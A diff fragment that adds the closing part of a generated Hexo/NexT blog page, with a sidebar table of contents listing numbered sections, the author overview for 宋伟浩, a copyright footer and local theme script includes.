+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#89"><span class="nav-number">1.</span> <span class="nav-text">89</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#92"><span class="nav-number">2.</span> <span class="nav-text">92</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#93"><span class="nav-number">3.</span> <span class="nav-text">93</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#94"><span class="nav-number">4.</span> <span class="nav-text">94</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#95"><span class="nav-number">5.</span> <span class="nav-text">95</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#96"><span class="nav-number">6.</span> <span class="nav-text">96</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#97"><span class="nav-number">7.</span> <span class="nav-text">97</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#100"><span class="nav-number">8.</span> <span class="nav-text">100</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#101"><span class="nav-number">9.</span> <span class="nav-text">101</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#102"><span class="nav-number">10.</span> <span class="nav-text">102</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#103"><span class="nav-number">11.</span> <span class="nav-text">103</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#104"><span class="nav-number">12.</span> <span class="nav-text">104</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#105"><span class="nav-number">13.</span> <span class="nav-text">105</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#106"><span class="nav-number">14.</span> <span class="nav-text">106</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#107"><span class="nav-number">15.</span> <span class="nav-text">107</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#108"><span class="nav-number">16.</span> <span class="nav-text">108</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#109"><span class="nav-number">17.</span> <span class="nav-text">109</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#110"><span class="nav-number">18.</span> <span class="nav-text">110</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#112"><span class="nav-number">19.</span> <span class="nav-text">112</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#113"><span class="nav-number">20.</span> <span class="nav-text">113</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#114"><span class="nav-number">21.</span> <span class="nav-text">114</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#115"><span class="nav-number">22.</span> <span class="nav-text">115</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#123"><span class="nav-number">23.</span> <span class="nav-text">123</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#125"><span class="nav-number">24.</span> <span class="nav-text">125</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#127"><span class="nav-number">25.</span> <span class="nav-text">127</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#128"><span class="nav-number">26.</span> <span class="nav-text">128</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#129"><span class="nav-number">27.</span> <span class="nav-text">129</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#130"><span class="nav-number">28.</span> <span class="nav-text">130</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#131"><span class="nav-number">29.</span> <span class="nav-text">131</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#132"><span class="nav-number">30.</span> <span class="nav-text">132</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#133"><span class="nav-number">31.</span> <span class="nav-text">133</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#134"><span class="nav-number">32.</span> <span class="nav-text">134</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#135"><span class="nav-number">33.</span> <span class="nav-text">135</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#136"><span class="nav-number">34.</span> <span class="nav-text">136</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#137"><span class="nav-number">35.</span> <span class="nav-text">137</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#138"><span class="nav-number">36.</span> <span class="nav-text">138</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#140"><span class="nav-number">37.</span> <span class="nav-text">140</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#141"><span class="nav-number">38.</span> <span class="nav-text">141</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#142"><span class="nav-number">39.</span> <span class="nav-text">142</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#143"><span class="nav-number">40.</span> <span class="nav-text">143</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#144"><span class="nav-number">41.</span> <span class="nav-text">144</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#145"><span class="nav-number">42.</span> <span class="nav-text">145</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#146"><span class="nav-number">43.</span> <span class="nav-text">146</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#147"><span class="nav-number">44.</span> <span class="nav-text">147</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#148"><span class="nav-number">45.</span> <span class="nav-text">148</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">宋伟浩</p>
+  <div class="site-description" itemprop="description">站在巨人的肩上</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">宋伟浩</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
